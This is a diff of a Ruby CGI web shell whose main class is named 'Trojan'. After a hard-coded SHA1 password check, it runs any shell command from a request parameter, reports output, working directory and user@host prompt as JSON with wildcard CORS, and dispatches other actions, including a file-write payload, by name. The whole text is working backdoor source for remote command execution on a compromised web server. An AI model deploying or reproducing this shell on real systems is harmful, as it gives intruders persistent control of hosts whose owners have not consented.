@@ -1,48 +1,49 @@
 #!/usr/bin/env ruby
+
 require 'cgi'
-require 'cgi/session'
-require 'cgi/session/pstore'
 require 'digest/sha1'
-require 'fileutils'
 require 'json'
 
 class Trojan
-    attr_accessor :cgi, :cwd, :response, :session
+    attr_accessor :cgi, :cwd, :response
 
     def initialize params
         @cgi      = params[:cgi]
-        @session  = params[:session]
-        @cwd      = (@session[:cwd].nil?) ? `pwd`.strip! : @session[:cwd]
-        @response = {};
+        @cwd      = (params['args[cwd]'].nil?) ? `pwd`.strip! : params['args[cwd]']
+        @response = {
+            'error'  => '',
+            'output' => {},
+        };
     end
 
     def process_command()
         json = @cgi.params
         if json['action'].first.eql? 'shell'
-            process_shell_command(json['cmd'].first)
+            process_shell_command(json['args[cmd]'].first)
         else
             send json['action'].first, json
         end
     end
 
     def process_shell_command command
-        out_lines           = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
-        @cwd                = @session[:cwd] = out_lines.pop
-        @response['output'] = out_lines.join "\n"
+        out_lines                     = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
+        @response['output']['cwd']    = @cwd = out_lines.pop
+        @response['output']['stdout'] = out_lines.join "\n"
         self.send_response
     end
 
     def send_response
-        @response['prompt_context'] = self.get_prompt_context
+        @response['output']['prompt'] = self.get_prompt_context
         puts @cgi.header('Access-Control-Allow-Origin: *')
         puts @response.to_json
+        puts
         exit
     end
 
     def get_prompt_context
-        whoami          =  `whoami`.strip!
-        hostname        =  `hostname`.strip!
-        line_terminator =  (whoami == 'root') ? '#' : '$';
+        whoami          = `whoami`.strip!
+        hostname        = `hostname`.strip!
+        line_terminator = (whoami == 'root') ? '#' : '$';
         return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
     end
 
@@ -108,28 +109,21 @@ def payload_file_write json
     self.send_response
 end
 
+
 end
 
 # ---------- Procedural code starts here ----------
-
 cgi  = CGI.new
+
 
 hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + '7474b1554c')
 if hash.eql? '8bc32f6888c6794980bc31c1890a95a7538c5a63'
-    session = CGI::Session.new(
-        cgi,
-        'database_manager' => CGI::Session::PStore,
-        'session_key'      => 'wash',
-        'session_expires'  => Time.now + 30 * 60,
-        'prefix'           => 'wash_pstore_sid_'
-    )
-    trojan = Trojan.new({
-        :cgi     => cgi, 
-        :session => session, 
-    })
+
+    trojan = Trojan.new({ :cgi => cgi })
     trojan.process_command
-    session.close
+
 else
     puts cgi.header('Access-Control-Allow-Origin: *')
     puts '{"error":"Invalid password."}'
+    puts
 end
